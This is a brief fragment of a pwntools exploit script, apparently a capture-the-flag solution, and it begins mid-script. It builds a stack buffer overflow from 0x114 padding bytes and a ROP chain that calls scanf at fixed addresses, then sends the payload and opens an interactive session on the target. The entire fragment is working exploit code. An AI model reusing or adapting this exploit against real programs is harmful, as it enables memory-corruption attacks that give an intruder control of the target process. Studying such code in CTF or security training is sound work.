...
sl("a")
ru(": ")
# sl("\x1d7+:5\x11-18>t_of_Happiness"+buf)
payload = "a"*0x114 
payload += rop.call('__isoc99_scanf', 0x80487FB,0x08049AA4) +p32(0x08049AA4)
sl(payload)
sl(buf)
p.interactive()